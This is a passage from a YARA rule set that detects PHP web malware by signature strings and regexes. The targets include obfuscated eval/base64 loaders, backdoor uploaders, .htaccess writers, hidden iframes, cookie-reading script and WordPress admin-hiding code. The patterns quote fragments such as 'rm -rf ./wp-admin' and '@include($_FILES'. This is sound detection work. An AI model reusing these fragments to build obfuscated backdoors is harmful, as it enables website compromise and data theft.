        $trigger = "eval(gzinflate(base64_decode('rVdbU"
    condition:
        $trigger
}

rule php_malware_generic_005 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('DZ"
    condition:
        $trigger
}

rule php_malware_generic_006_02 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"ZnVu"
    condition:
        $trigger
}

rule php_malware_generic_007 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"JGNvZGU"
    condition:
        $trigger
}

rule php_malware_generic_008 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"JHgw"
    condition:
        $trigger
}

rule php_malware_generic_009 : malware
{
    strings:
        $trigger = "eval(base64_decode('JHgw"
    condition:
        $trigger
}

rule php_malware_generic_010 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"aWY"
    condition:
        $trigger
}

rule php_malware_generic_012 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"CmVy"
    condition:
        $trigger
}

rule php_malware_generic_013 : malware
{
    strings:
        $trigger = "eval (base64_decode(\"IC8q"
    condition:
        $trigger
}

rule php_malware_generic_014 : malware
{
    strings:
        $trigger = "eval(base64_decode('LypCQ"
    condition:
        $trigger
}

rule php_malware_generic_016 : malware
{
    strings:
        $trigger = "eval(base64_decode(\"Y2xhc3Mgbm"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_generic_019 : malware
{
    strings:
        $trigger = "base64_decode"
        $php_malware_generic_019_r0 = /eval[\s]*\([\s]*gzuncompress[\s]*\([\s]*base64_decode[\s]*\([^)]{30}/
    condition:
        $trigger and PR00029 and $php_malware_generic_019_r0
}

// MANUAL FIX NECESSARY
rule php_malware_generic_019_02 : malware
{
    strings:
        $trigger = "base64_decode"
        $php_malware_generic_019_02_r0 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*eval/
        $php_malware_generic_019_02_r1 = /<\?php[\s]*\$[\w]+[\s]*=[\s]*eval[^;]{30,};/
    condition:
        $trigger and PR00029 and $php_malware_generic_019_02_r0 and $php_malware_generic_019_02_r1
}

rule php_malware_generic_020 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode('HZz"
    condition:
        $trigger
}

private rule PR04800 : trigger
{
    strings:
        $ps0 = "eval(gzinflate(base64_decode('HZz"
    condition:
        $ps0
}

rule php_malware_generic_020_001 : malware
{
    strings:
        $trigger = "HZzHkuNQdgV/ZXYzE1jAu5"
    condition:
        $trigger and PR04800
}

rule php_malware_generic_021 : malware
{
    strings:
        $trigger = "eval(gzinflate(base64_decode(\"BcFJ"
    condition:
        $trigger
}

rule php_malware_generic_023 : malware
{
    strings:
        $trigger = "echo(gzinflate(base64_decode(\""
    condition:
        $trigger
}

rule php_malware_generic_024 : malware
{
    strings:
        $trigger = "eval(\"\".base64_decode("
    condition:
        $trigger
}

rule php_malware_generic_025 : malware
{
    strings:
        $trigger = "eval(''.base64_decode("
    condition:
        $trigger
}

rule php_malware_generic_026 : malware
{
    strings:
        $trigger = "@eval( base64_decode("
    condition:
        $trigger
}

rule php_malware_generic_028 : malware
{
    strings:
        $trigger = "eval(\"\\x65\\x76\\x61\\x6C"
    condition:
        $trigger
}

private rule PR04801 : trigger
{
    strings:
        $ps0 = "eval(\"\\x65\\x76\\x61\\x6C"
    condition:
        $ps0
}

rule php_malware_generic_028_02 : malware
{
    strings:
        $trigger = "=\"eval\";eval(\"\\x65"
    condition:
        $trigger and PR04801
}

rule php_malware_generic_030 : malware
{
    strings:
        $trigger = " = strrev('etalfnizg');eval($"
    condition:
        $trigger
}

private rule PR04802 : trigger
{
    strings:
        $ps0 = "if (!function_exists(\"b_call\")) {"
    condition:
        $ps0
}

rule php_malware_generic_031 : malware
{
    strings:
        $trigger = "preg_replace"
    condition:
        $trigger and PR04802
}

rule php_malware_generic_034 : malware
{
    strings:
        $trigger = "_']=Array(base64_decode('Z"
    condition:
        $trigger
}

private rule PR04803 : trigger
{
    strings:
        $ps0 = "_']=Array(base64_decode('Z"
    condition:
        $ps0
}

private rule PR04804 : trigger
{
    strings:
        $ps0 = "Array('aHR0"
    condition:
        $ps0
}

rule php_malware_generic_034_02 : malware
{
    strings:
        $trigger = "echo $_"
    condition:
        $trigger and PR04803 and PR04804
}

rule php_malware_generic_036_02 : malware
{
    strings:
        $trigger = "echo '<div style=\"position:absolute; left:-"
    condition:
        $trigger
}

rule php_malware_generic_037 : malware
{
    strings:
        $trigger = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28"
    condition:
        $trigger
}

rule php_malware_generic_037_02 : malware
{
    strings:
        $trigger = "php Error_Reporting(0); $"
    condition:
        $trigger
}

rule php_malware_generic_038 : malware
{
    strings:
        $trigger = "preg_replace(\"/B8Ra=QZ6J1FyUNgda6cIu7kF/e\""
    condition:
        $trigger
}

private rule PR04805 : trigger
{
    strings:
        $ps0 = "class TokenInitEx"
    condition:
        $ps0
}

rule php_malware_generic_039 : malware
{
    strings:
        $trigger = "exec"
    condition:
        $trigger and PR04805
}

rule php_malware_generic_041 : malware
{
    strings:
        $trigger = "$ingredients=file(dirname(__FILE__).'/ingredients.txt');"
    condition:
        $trigger and PR00091
}

rule php_malware_generic_042 : malware
{
    strings:
        $trigger = "file_get_contents(\"http://\".$_SERVER['HTTP_HOST'].\"/includes/js/k4yrR.txt\");"
    condition:
        $trigger
}

private rule PR04806 : trigger
{
    strings:
        $ps0 = "rm -rf ./wp-admin ./wp-includes"
    condition:
        $ps0
}

rule php_malware_generic_043 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04806
}

rule php_malware_generic_044 : malware
{
    strings:
        $trigger = "]=='1'){echo '200'; exit;}"
    condition:
        $trigger and PR00732
}

rule php_malware_generic_048 : malware
{
    strings:
        $trigger = "json_decode(base64_decode(substr($_POST"
    condition:
        $trigger
}

private rule PR04807 : trigger
{
    strings:
        $ps0 = "5.61.36.66/jobhO.swf"
    condition:
        $ps0
}

rule php_malware_generic_049 : malware
{
    strings:
        $trigger = "swf?myid"
    condition:
        $trigger and PR04807
}

rule php_malware_generic_050 : malware
{
    strings:
        $trigger = "ini_set('display_errors','Off'); @eval"
    condition:
        $trigger
}

rule php_malware_generic_054 : malware
{
    strings:
        $trigger = "@assert(str_rot13('riny(onfr64_qrpbqr"
    condition:
        $trigger
}

rule php_malware_generic_054_02 : malware
{
    strings:
        $trigger = "@$strings(str_rot13('riny(onfr64_qrpbqr("
    condition:
        $trigger
}

private rule PR04808 : trigger
{
    strings:
        $ps0 = "//###="
    condition:
        $ps0
}

rule php_malware_generic_055 : malware
{
    strings:
        $trigger = "error_reporting(0); ini_set(\"display_errors\", \"0\"); if (!isset("
    condition:
        $trigger and PR04808
}

private rule PR04809 : trigger
{
    strings:
        $ps0 = "<input type=\"file\" name=\"files[]\" /><button>ndsxf~/</boutton>"
    condition:
        $ps0
}

rule php_malware_generic_058 : malware
{
    strings:
        $trigger = "=\"http://"
    condition:
        $trigger and PR04809
}

private rule PR04810 : trigger
{
    strings:
        $ps0 = "$str = <<<EOD"
    condition:
        $ps0
}

private rule PR04811 : trigger
{
    strings:
        $ps0 = "unlink( MyFileName() );"
    condition:
        $ps0
}

rule php_malware_generic_059 : malware
{
    strings:
        $trigger = "base64_decod"
    condition:
        $trigger and PR04810 and PR01877 and PR04811
}

private rule PR04812 : trigger
{
    strings:
        $ps0 = "*/ if(is_object($_SESSION[\"__default\"][\"user\"]) && !($_SESSION[\"__default\"][\"user\"]->id"
    condition:
        $ps0
}

rule php_malware_generic_060 : malware
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04812 and PR00050
}

rule php_malware_generic_063 : malware
{
    strings:
        $trigger = "$_SERVER[\"HTTP_X_FORWARDED_FOR\"]); $_SERVER[\"HTTP_USER_AGENT\"] = str_replace(array("
    condition:
        $trigger
}

rule php_malware_generic_064 : malware
{
    strings:
        $trigger = "echo me_file_get_contents($filename)"
    condition:
        $trigger and PR00435
}

private rule PR04813 : trigger
{
    strings:
        $ps0 = "{header('HTTP/1.0 404 Not Found');exit;}"
    condition:
        $ps0
}

rule php_malware_generic_065 : malware
{
    strings:
        $trigger = "if (!isset($_COOKIE["
    condition:
        $trigger and PR04813
}

rule php_malware_generic_066 : malware
{
    strings:
        $trigger = "function massive_folder($put, $glubina, $max_massive)"
    condition:
        $trigger and PR00435 and PR00917
}

private rule PR04814 : trigger
{
    strings:
        $ps0 = "echo 'createa failed!';"
    condition:
        $ps0
}

rule php_malware_generic_067 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04814
}

private rule PR04815 : trigger
{
    strings:
        $ps0 = "$root.$GLOBALS{$_GET{"
    condition:
        $ps0
}

rule php_malware_generic_069 : malware
{
    strings:
        $trigger = "gzinflate(substr('"
    condition:
        $trigger and PR04815 and PR00091 and PR00342
}

rule php_malware_generic_070 : malware
{
    strings:
        $trigger = ">Uploaded By Back-DOOR<"
    condition:
        $trigger and PR00732
}

rule php_malware_generic_071 : malware
{
    strings:
        $trigger = "Z2xvYmFsICRhdXRoX3Bhc3MsJGNvbG9yLCRkZWZhdWx0X2FjdGlvbiwkZGVmYXVs"
    condition:
        $trigger and PR01179
}

private rule PR04816 : trigger
{
    strings:
        $ps0 = "bot"
    condition:
        $ps0
}

rule php_malware_generic_073 : malware
{
    strings:
        $trigger = "nama:\"Cvar1984.phtml\""
    condition:
        $trigger and PR04816
}

private rule PR04817 : trigger
{
    strings:
        $ps0 = "[\"rnd\"]);}elseif($_POST["
    condition:
        $ps0
}

rule php_malware_generic_075 : malware
{
    strings:
        $trigger = "if($_GET["
    condition:
        $trigger and PR04817
}

// MANUAL FIX NECESSARY
rule php_malware_generic_076 : malware
{
    strings:
        $trigger = "chr"
        $php_malware_generic_076_r0 = /\.\s*chr\(\d+\)\s*\./
        $php_malware_generic_076_r1 = /\$[\w]+[\s]*=[\s]*\"[^\"]{30,}\";[\s]*\$[\w]+[\s]*=[\s]*[^\$]+chr\([\d]+\)\.[\s]*['\"]\\x[a-f0-9]+['\"][\s]*\.[^\$]+;[\s]*(\$[\w]+[\s]*=[^\$]+chr\([^\$]+;[\s]*)+\$[\w]+[\s]*=[\s]*\$[\w]+[\s]*\.['\"]+[^'\"]{2000}/
    condition:
        $trigger and $php_malware_generic_076_r0 and $php_malware_generic_076_r1
}

rule php_malware_generic_077 : malware
{
    strings:
        $trigger = "echo \"-=PATH=- $wroot"
    condition:
        $trigger
}

// MANUAL FIX NECESSARY
rule php_malware_generic_078 : malware
{
    strings:
        $trigger = ".chr"
        $php_malware_generic_078_r0 = /(\$[\w]+\['[\w]+'\][\s]*=[\s]*[^\n]+;[\s]*){2,}\$[\w]+[\s]*=[\s]*[^;]+chr\([\d]+\)[\s]*\.['\"]+[^;]+\.chr[^;]+;[\s]*\$[\w]+[\s]*=[\s]*[^;]+\\x[\w]{2}[^$]+\$[\w]+[\s]*=[\s]*\$[\w]+[\s]*\.[^;]{1000,};[\s]*\$[\w]+\[[^\]]+\]\(\$[\w]+\[[^\]]+\]\[[\d]+\][\s]*\.[^;]+\);/
    condition:
        $trigger and $php_malware_generic_078_r0
}

// MANUAL FIX NECESSARY
rule php_malware_generic_079 : malware
{
    strings:
        $trigger = "rror_"
        $php_malware_generic_079_r0 = /php[\s]*[Ee]rror_[Rr]eporting\([\s]*0[\s]*\);[\s]*eval[\s]*\([\s]*[\w]+[\s]*\([\s]*base64_decode[\s]*\([\s]*.[^)]{30}/
    condition:
        $trigger and PR00029 and PR01422 and $php_malware_generic_079_r0
}

rule php_malware_generic_080 : malware
{
    strings:
        $trigger = "{ $x .= pack('H*', substr($"
    condition:
        $trigger
}

private rule PR04818 : trigger
{
    strings:
        $ps0 = "]:'';if(!empty($"
    condition:
        $ps0
}

private rule PR04819 : trigger
{
    strings:
        $ps0 = "])?$_GET["
    condition:
        $ps0
}

rule php_malware_generic_082 : malware
{
    strings:
        $trigger = ")){echo"
    condition:
        $trigger and PR02521 and PR04818 and PR04819
}

rule php_malware_generic_087 : malware
{
    strings:
        $trigger = "CBBDHBFEREMLGFgMXFVKS01WAkgfVh1dV0pPVgtLIXIIHw"
    condition:
        $trigger and PR00029 and PR01422
}

// MANUAL FIX NECESSARY
rule php_malware_generic_088 : malware
{
    strings:
        $trigger = "echo"
        $php_malware_generic_088_r0 = /echo .<script[^>]*[^\.]*png.{1,5}<\/script>\";/
    condition:
        $trigger and PR00050 and $php_malware_generic_088_r0
}

private rule PR04820 : trigger
{
    strings:
        $ps0 = "This website is not equipped with readability feature for Visually"
    condition:
        $ps0
}

rule php_malware_generic_089 : malware
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR04820 and PR00050
}

rule php_malware_generic_090 : malware
{
    strings:
        $trigger = "$virus = openssl_decrypt(base64_decode($output),"
    condition:
        $trigger
}

rule php_malware_generic_092 : malware
{
    strings:
        $trigger = "strpos($_SERVER['REQUEST_URI'], '/blog/viagra"
    condition:
        $trigger and PR00435
}

private rule PR04821 : trigger
{
    strings:
        $ps0 = "7q2Ubx1ep0TXWGwBWaQG1E"
    condition:
        $ps0
}

rule php_malware_generic_093 : malware
{
    strings:
        $trigger = "));$"
    condition:
        $trigger and PR01498 and PR04821
}

private rule PR04822 : trigger
{
    strings:
        $ps0 = "unlink($_SERVER[\"SCRIPT_FILENAME"
    condition:
        $ps0
}

private rule PR04823 : trigger
{
    strings:
        $ps0 = "@rmdir($path.$val"
    condition:
        $ps0
}

rule php_malware_generic_095 : malware
{
    strings:
        $trigger = "isset($_REQUEST["
    condition:
        $trigger and PR04822 and PR04823
}

private rule PR04824 : trigger
{
    strings:
        $ps0 = "));die();break;}endif;"
    condition:
        $ps0
}

private rule PR04825 : trigger
{
    strings:
        $ps0 = "=Array(base64_decode("
    condition:
        $ps0
}

rule php_malware_generic_096 : malware
{
    strings:
        $trigger = ");return base64_decode($"
    condition:
        $trigger and PR04824 and PR04825
}

private rule PR04826 : trigger
{
    strings:
        $ps0 = "}{0x001};"
    condition:
        $ps0
}

rule php_malware_generic_097 : malware
{
    strings:
        $trigger = "gzinflate(substr('"
    condition:
        $trigger and PR00091 and PR04826 and PR00342
}

rule php_malware_generic_098 : malware
{
    strings:
        $trigger = "@unserialize(gzinflate(file_get_contents($"
    condition:
        $trigger and PR03580 and PR00431
}

private rule PR04827 : trigger
{
    strings:
        $ps0 = "filename=\\\"all.iz\\\"\""
    condition:
        $ps0
}

rule php_malware_generic_099 : malware
{
    strings:
        $trigger = "header('Content-Type:"
    condition:
        $trigger and PR04827 and PR01021 and PR01431
}

private rule PR04828 : trigger
{
    strings:
        $ps0 = "if (!is_single() && is_admin()) {"
    condition:
        $ps0
}

rule php_malware_generic_100 : malware
{
    strings:
        $trigger = "AND {$wpdb->posts}.post_author NOT IN ($idsCommaSeparated)"
    condition:
        $trigger and PR04828 and PR01533
}

rule php_malware_generic_101 : malware
{
    strings:
        $trigger = "JykpKTtyZXR1cm47'));return;?>"
    condition:
        $trigger and PR00029 and PR00265
}

private rule PR04829 : trigger
{
    strings:
        $ps0 = "if( !@stream_copy_to_stream( @fopen( base64_decode( $_GET['"
    condition:
        $ps0
}

rule php_malware_generic_102 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04829 and PR00355
}

rule php_malware_generic_103 : malware
{
    strings:
        $trigger = "=false;break;}}if($a){@"
    condition:
        $trigger and PR00092
}

rule php_malware_generic_104 : malware
{
    strings:
        $trigger = "if(isset($_GET['del']) &&  $_GET['del'] == '1'"
    condition:
        $trigger and PR00046 and PR01468 and PR01330
}

private rule PR04830 : trigger
{
    strings:
        $ps0 = "='<'.'?php /**/ $"
    condition:
        $ps0
}

rule php_malware_generic_106 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00355 and PR04830 and PR00357
}

private rule PR04831 : trigger
{
    strings:
        $ps0 = "){@header($"
    condition:
        $ps0
}

private rule PR04832 : trigger
{
    strings:
        $ps0 = "]($_REQUEST["
    condition:
        $ps0
}

private rule PR04833 : trigger
{
    strings:
        $ps0 = "CURLOPT_RETURNTRANSFER,1);$"
    condition:
        $ps0
}

rule php_malware_generic_107 : malware
{
    strings:
        $trigger = "\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53"
    condition:
        $trigger and PR01379 and PR04831 and PR04832 and PR04833
}

rule php_malware_generic_110 : malware
{
    strings:
        $trigger = "\\x75\\x74\\x66\\x2d\\x38\"); die($"
    condition:
        $trigger and PR01613
}

private rule PR04834 : trigger
{
    strings:
        $ps0 = "<!--SYSADMIN-->"
    condition:
        $ps0
}

rule php_malware_generic_111 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01428 and PR01021 and PR04834
}

rule php_malware_generic_112 : malware
{
    strings:
        $trigger = "if ( in_array( 'administrator', (array) $wp_user->roles ) ) {"
    condition:
        $trigger and PR00203
}

private rule PR04835 : trigger
{
    strings:
        $ps0 = "str_replace(\"define('DISALLOW_FILE_MODS"
    condition:
        $ps0
}

rule php_malware_generic_113 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR04835
}

private rule PR04836 : trigger
{
    strings:
        $ps0 = "preg_match(\"/\".$email.\"/\", file_get_contents($"
    condition:
        $ps0
}

rule php_malware_generic_114 : malware
{
    strings:
        $trigger = "fopen"
    condition:
        $trigger and PR04836 and PR00355
}

private rule PR04837 : trigger
{
    strings:
        $ps0 = "strpos($views['administrator']"
    condition:
        $ps0
}

rule php_malware_generic_115 : malware
{
    strings:
        $trigger = "$users['avail_roles']['administrator'] - 1;"
    condition:
        $trigger and PR04837 and PR04411
}

// MANUAL FIX NECESSARY
private rule PR04838 : trigger
{
    strings:
        $ps0 = "!isset($_GET['user_ip'])"
    condition:
        $ps0
}

private rule PR04839 : trigger
{
    strings:
        $ps0 = "aHR0cDovL2"
    condition:
        $ps0
}

rule php_malware_generic_116 : malware
{
    strings:
        $trigger = "user_ip'=>$_SERVER['REMOTE_ADDR'],'user_ua"
        $php_malware_generic_116_r0 = /\$[\w]+\)[\s]*\)[\s]*\{[\s]*\$[\w]+[\s]*=[\s]*curl_init\(\);/
    condition:
        $trigger and PR04838 and PR04839 and PR04497 and $php_malware_generic_116_r0
}

private rule PR04840 : trigger
{
    strings:
        $ps0 = "edocne_nosj"
    condition:
        $ps0
}

private rule PR04841 : trigger
{
    strings:
        $ps0 = "esab_kcaptej_pw "
    condition:
        $ps0
}

rule php_malware_generic_117 : malware
{
    strings:
        $trigger = "get_"
    condition:
        $trigger and PR04840 and PR01488 and PR04841
}

rule php_malware_generic_119 : malware
{
    strings:
        $trigger = "(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(\"?>\".$"
    condition:
        $trigger
}

private rule PR04842 : trigger
{
    strings:
        $ps0 = "foreach ($_SERVER as"
    condition:
        $ps0
}

rule php_malware_generic_120 : malware
{
    strings:
        $trigger = "php\\n\";"
    condition:
        $trigger and PR00301 and PR04842
}

// MANUAL FIX NECESSARY
rule php_malware_generic_121 : malware
{
    strings:
        $trigger = "(base64_decode("
        $php_malware_generic_121_r0 = /eval\(base64_decode\(.?ZX/
    condition:
        $trigger and $php_malware_generic_121_r0
}

// MANUAL FIX NECESSARY
rule php_malware_generic_122 : malware
{
    strings:
        $trigger = "base64_decod"
        $php_malware_generic_122_r0 = /echo base64_decode\(.PHNjcmlw/
    condition:
        $trigger and PR01877 and $php_malware_generic_122_r0
}

// MANUAL FIX NECESSARY
rule php_malware_generic_124 : malware
{
    strings:
        $trigger = "base64_decode"
        $php_malware_generic_124_r0 = /<\?(php)?\s*(\/\*\*\/|\/\*[^\*]+\*\/)?\s*eval\(base64_decode\(.JG/
    condition:
        $trigger and PR00029 and $php_malware_generic_124_r0
}

rule php_malware_generic_126 : malware
{
    strings:
        $trigger = "str_replace(\"\\n\", \"11111111111111\", $"
    condition:
        $trigger
}

private rule PR04843 : trigger
{
    strings:
        $ps0 = "]]);}exit();} ?>"
    condition:
        $ps0
}

rule php_malware_GLOBALS_001 : malware
{
    strings:
        $trigger = "sprintf($"
    condition:
        $trigger and PR01799 and PR04843
}

private rule PR04844 : trigger
{
    strings:
        $ps0 = "<? $GLOBALS['_"
    condition:
        $ps0
}

rule php_malware_GLOBALS_002 : malware
{
    strings:
        $trigger = "$host/$id\");break;default:$doheader"
    condition:
        $trigger and PR04844
}

private rule PR04845 : trigger
{
    strings:
        $ps0 = "]=Array();global"
    condition:
        $ps0
}

rule php_malware_GLOBALS_003 : malware
{
    strings:
        $trigger = "],);echo@$"
    condition:
        $trigger and PR04845 and PR01799 and PR00634
}

private rule PR04846 : trigger
{
    strings:
        $ps0 = "]] = $_COOKIE;"
    condition:
        $ps0
}

private rule PR04847 : trigger
{
    strings:
        $ps0 = "$GLOBALS[$GLOBALS['"
    condition:
        $ps0
}

rule php_malware_GLOBALS_004 : malware
{
    strings:
        $trigger = "echo @$GLOBALS[$GLOBALS["
    condition:
        $trigger and PR00029 and PR04846 and PR04847
}

private rule PR04848 : trigger
{
    strings:
        $ps0 = ");}}}$GLOBALS["
    condition:
        $ps0
}

rule php_malware_GLOBALS_005 : malware
{
    strings:
        $trigger = ")))<round(0+0.5+0.5)){$GLOBALS["
    condition:
        $trigger and PR04848
}

private rule PR04849 : trigger
{
    strings:
        $ps0 = "\"]('index.htm')){echo ${\"\\x"
    condition:
        $ps0
}

rule php_malware_GLOBALS_006 : malware
{
    strings:
        $trigger = "if(${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}"
    condition:
        $trigger and PR04849
}

// MANUAL FIX NECESSARY
rule php_malware_GLOBALS_007 : malware
{
    strings:
        $trigger = "\\x"
        $php_malware_GLOBALS_007_r0 = /\$GLOBALS;\${.(.x47|G)(.x4c|L)(.x4f|O)(.x47|B)/
    condition:
        $trigger and PR01799 and $php_malware_GLOBALS_007_r0
}

// MANUAL FIX NECESSARY
private rule PR04850 : trigger
{
    strings:
        $ps0 = "urlencode($_"
    condition:
        $ps0
}

rule php_malware_GLOBALS_008 : malware
{
    strings:
        $trigger = "file_get_contents(${${\""
        $php_malware_GLOBALS_008_r0 = /\$\{\"(G|.x47)(L|.x4c)(O|.x4f)(B|.x42)(A|.x41)(L|.x4c)(S|.x53)\"\}\[\"[^\"]+\"\][\s]*=[\s]*\"[^\"]+\";[\s]*\$\{\"(G|.x47)(L|.x4c)(O|.x4f)(B|.x42)(A|.x41)(L|.x4c)(S|.x53)\"\}\[\"[^\"]+\"\][\s]*=[\s]*\"[^\"]+\";[\s]*[^\n]+\}/
    condition:
        $trigger and PR04850 and $php_malware_GLOBALS_008_r0
}

private rule PR04851 : trigger
{
    strings:
        $ps0 = ")@include("
    condition:
        $ps0
}

private rule PR04852 : trigger
{
    strings:
        $ps0 = ";(PHP_OS=="
    condition:
        $ps0
}

rule php_malware_GLOBALS_008_02 : malware
{
    strings:
        $trigger = ";error_reporting(0);if(!defined("
    condition:
        $trigger and PR04851 and PR00265 and PR04852
}

// MANUAL FIX NECESSARY
rule php_malware_GLOBALS_009 : malware
{
    strings:
        $trigger = "\\x7"
        $php_malware_GLOBALS_009_r0 = /<\?php[\s]*\$\{\"(G|.x47)(L|.x4c)(O|.x4f)(B|.x42)(A|.x41)(L|.x4c)(S|.x53)\"\}\[\"[^\"]+\"\]=\"[^;]+;[\s]*\$\{[^\n]+[\s]*\?>[\s]*<\?/
    condition:
        $trigger and $php_malware_GLOBALS_009_r0
}

private rule PR04853 : trigger
{
    strings:
        $ps0 = "));$GLOBALS['_"
    condition:
        $ps0
}

private rule PR04854 : trigger
{
    strings:
        $ps0 = ")^round("
    condition:
        $ps0
}

private rule PR04855 : trigger
{
    strings:
        $ps0 = "));else{$GLOBALS"
    condition:
        $ps0
}

private rule PR04856 : trigger
{
    strings:
        $ps0 = "(__FILE__);while(round("
    condition:
        $ps0
}

rule php_malware_GLOBALS_010 : malware
{
    strings:
        $trigger = ",round(0+"
    condition:
        $trigger and PR04853 and PR04854 and PR04855 and PR04856
}

private rule PR04857 : trigger
{
    strings:
        $ps0 = "\"]}=base64_decode(\"aW5wdXQ=\");${${\""
    condition:
        $ps0
}

rule php_malware_GLOBALS_011 : malware
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04857
}

// MANUAL FIX NECESSARY
rule php_malware_GLOBALS_012 : malware
{
    strings:
        $trigger = "$GLOBALS["
        $php_malware_GLOBALS_012_r0 = /\$GLOBALS\[['\"]\w+['\"]\]\(\$GLOBALS\[['\"]\w+['\"]\]\(\$\w+\)\)/
    condition:
        $trigger and PR00675 and $php_malware_GLOBALS_012_r0
}

// MANUAL FIX NECESSARY
rule php_malware_GLOBALS_014 : malware
{
    strings:
        $trigger = "$GLOBALS["
        $php_malware_GLOBALS_014_r0 = /\s{200}[^;]+(\$\w+)\s*=\s*\$GLOBALS\[.[_COKIE'\\"\s\.]+\]/
    condition:
        $trigger and $php_malware_GLOBALS_014_r0
}

rule php_malware_google_api_001 : malware
{
    strings:
        $trigger = "array(0,97,98,99,100,101,108,115,118,105,110,111,117,109,112,114)"
    condition:
        $trigger and PR01483
}

private rule PR04858 : trigger
{
    strings:
        $ps0 = "gzuncompress("
    condition:
        $ps0
}

rule php_malware_gzuncompress_004 : malware
{
    strings:
        $trigger = "include stream_get_meta_data("
    condition:
        $trigger and PR04858 and PR00070
}

private rule PR04859 : trigger
{
    strings:
        $ps0 = "while (1==1)"
    condition:
        $ps0
}

rule php_malware_harakiri_001 : malware
{
    strings:
        $trigger = "@unlink($_SERVER['SCRIPT_FILENAME']);"
    condition:
        $trigger and PR00435 and PR04859
}

private rule PR04860 : trigger
{
    strings:
        $ps0 = "@$Hello_Dolly=\""
    condition:
        $ps0
}

rule php_malware_hello_dolly_001 : malware
{
    strings:
        $trigger = "\\x7"
    condition:
        $trigger and PR04860
}

rule php_malware_hiddeniframe_001 : malware
{
    strings:
        $trigger = "if(preg_match(base64_decode('Lyh5YW5kZXh"
    condition:
        $trigger
}

rule php_malware_hiddeniframe_002 : malware
{
    strings:
        $trigger = "=document.cookie.replace(/\\s/g,\"\").split(\";\");for(var"
    condition:
        $trigger
}

private rule PR04861 : trigger
{
    strings:
        $ps0 = "co.be/forum.php?tp"
    condition:
        $ps0
}

private rule PR04862 : trigger
{
    strings:
        $ps0 = "=\"hxxp://"
    condition:
        $ps0
}

rule php_malware_hiddeniframe_003 : malware
{
    strings:
        $trigger = ">"
    condition:
        $trigger and PR04861 and PR04862
}

private rule PR04863 : trigger
{
    strings:
        $ps0 = "$file->SaveToBin(\"wp-admin.zip\");"
    condition:
        $ps0
}

rule php_malware_hobodun_001 : malware
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04863
}

rule php_malware_hostlog_001 : malware
{
    strings:
        $trigger = "saiforaviado_ip"
    condition:
        $trigger and PR00091
}

private rule PR04864 : trigger
{
    strings:
        $ps0 = "fopen(\".htaccess\""
    condition:
        $ps0
}

rule php_malware_htaccess_writer_001 : malware
{
    strings:
        $trigger = "<h1>htrescue</h1>"
    condition:
        $trigger and PR04864 and PR01458
}

rule php_malware_htaccess_writer_002 : malware
{
    strings:
        $trigger = "$name = base64_decode(\"Lmh0YWNjZXNz\");"
    condition:
        $trigger and PR00203 and PR00205
}

rule php_malware_include_007 : malware
{
    strings:
        $trigger = "include('sucuri-"
    condition:
        $trigger
}

private rule PR04865 : trigger
{
    strings:
        $ps0 = "*/include "
    condition:
        $ps0
}

rule php_malware_include_012_02 : malware
{
    strings:
        $trigger = "*/\"\\x2"
    condition:
        $trigger and PR04865
}

private rule PR04866 : trigger
{
    strings:
        $ps0 = "if(strpos(strtolower($_SERVER['REQUEST_URI']),"
    condition:
        $ps0
}

rule php_malware_include_016 : malware
{
    strings:
        $trigger = "include(getcwd().'/"
    condition:
        $trigger and PR04866
}

rule php_malware_include_019 : malware
{
    strings:
        $trigger = "error_reporting(0);ini_set(\"display_errors\", 0);include_once(sys_get_temp_dir().\""
    condition:
        $trigger
}

rule php_malware_include_020 : malware
{
    strings:
        $trigger = "$localpath));include_once("
    condition:
        $trigger and PR00675
}

rule php_malware_include_022 : malware
{
    strings:
        $trigger = "@include('wp-admin/css/css.php');"
    condition:
        $trigger
}

private rule PR04867 : trigger
{
    strings:
        $ps0 = "\"\\x69\\x6e\\x74\\x76\\x61\\x6c\";"
    condition:
        $ps0
}

private rule PR04868 : trigger
{
    strings:
        $ps0 = "\"\\x63\\x68\\x72\";"
    condition:
        $ps0
}

rule php_malware_include_023 : malware
{
    strings:
        $trigger = "include_once($"
    condition:
        $trigger and PR04867 and PR04868
}

private rule PR04869 : trigger
{
    strings:
        $ps0 = "die($"
    condition:
        $ps0
}

rule php_malware_include_023_02 : malware
{
    strings:
        $trigger = "\"\\x63\\x68\\x72\";"
    condition:
        $trigger and PR04869 and PR04867
}

private rule PR04870 : trigger
{
    strings:
        $ps0 = "include(dirname(__FILE__).\"/wp-"
    condition:
        $ps0
}

rule php_malware_include_026 : malware
{
    strings:
        $trigger = ".png\"); die;"
    condition:
        $trigger and PR04870
}

// MANUAL FIX NECESSARY
rule php_malware_include_027 : malware
{
    strings:
        $trigger = "if(isset($_GET["
        $php_malware_include_027_r0 = /\]\)\)\{ include\(['\"]\/(home|var|root)/
    condition:
        $trigger and $php_malware_include_027_r0
}

private rule PR04871 : trigger
{
    strings:
        $ps0 = "is_file($optimizer) ? require_once($optimizer) : null;"
    condition:
        $ps0
}

rule php_malware_include_028 : malware
{
    strings:
        $trigger = "$optimizer='/"
    condition:
        $trigger and PR04871
}

private rule PR04872 : trigger
{
    strings:
        $ps0 = "@include($_FILES"
    condition:
        $ps0
}

rule php_malware_include_029 : malware
{
    strings:
